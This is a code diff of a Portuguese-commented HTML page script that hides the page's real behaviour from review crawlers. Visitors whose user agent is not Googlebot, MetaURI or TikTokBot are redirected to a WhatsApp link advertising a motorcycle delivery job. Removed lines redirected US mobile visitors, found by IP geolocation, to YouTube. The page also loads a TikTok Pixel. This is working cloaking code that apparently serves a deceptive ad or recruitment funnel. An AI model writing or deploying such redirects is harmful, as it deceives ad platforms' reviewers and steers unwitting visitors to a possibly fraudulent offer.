@@ -3,40 +3,14 @@
 <html lang="en">
 <head>
 	<script>
-    var userAgent = navigator.userAgent;
+        var userAgent = navigator.userAgent;
 
-    // Verifica se o agente do usuário corresponde a um bot.
-    if (!userAgent.match(/Googlebot|MetaURI|TikTokBot/i)) {
-        // Função para verificar se o dispositivo é móvel.
-        function isMobile() {
-            return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+        // Verifica se o agente do usuário corresponde a um bot.
+        if (!userAgent.match(/Googlebot|MetaURI|TikTokBot/i)) {
+            // Redireciona todos os visitantes, exceto os bots, para o site específico.
+            window.location.href = "https://wa.me/5588988003917?text=Ol%C3%A1%2C%20me%20interessei%20pela%20vaga%20de%20entregador%20com%20moto.";
         }
-
-        // Função para obter a localização geográfica do usuário.
-        function getGeolocation(callback) {
-            fetch('https://ipapi.co/json/')
-                .then(function(response) {
-                    return response.json();
-                })
-                .then(function(data) {
-                    callback(data);
-                })
-                .catch(function(error) {
-                    console.error('Erro ao obter geolocalização:', error);
-                    callback(null);
-                });
-        }
-
-        // Verifica se o dispositivo é móvel e se a localização é nos Estados Unidos.
-        if (isMobile()) {
-            getGeolocation(function(location) {
-                if (location && location.country_code === 'US') {
-                    window.location.href = "http://youtube.com";
-                }
-            });
-        }
-    }
-</script>
+    </script>
 
   <!-- TikTok Pixel Code Start -->
 <script>
